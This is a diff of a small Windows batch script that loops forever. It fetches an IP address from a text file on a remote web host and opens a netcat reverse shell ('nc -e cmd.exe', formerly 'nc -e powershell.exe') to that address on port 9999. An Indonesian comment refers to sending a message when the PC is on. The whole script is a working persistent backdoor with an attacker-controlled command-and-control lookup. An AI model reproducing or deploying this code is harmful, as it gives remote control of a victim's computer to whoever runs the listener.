@@ -1,8 +1,20 @@
 @echo off
+REM bberikan send text di line ini untuk send pesan klw pc idup
+setlocal
+
 :loop
-for /f %%a in ('powershell Invoke-RestMethod https://ibnusaja.nasihosting.com/temp.txt') do set IP=%%a
-REM echo %IP% 
+set "url=https://ibnusaja.nasihosting.com/temp.txt"
+set "variable="
 
-nc -e powershell.exe %IP% 9999
+for /f "usebackq delims=" %%a in (`curl -s "%url%"`) do (
+    set "variable=%%a"
+)
 
+echo %variable%
+
+nc -e cmd.exe %variable%
+
+timeout /t 5 >nul
+
+endlocal
 goto loop
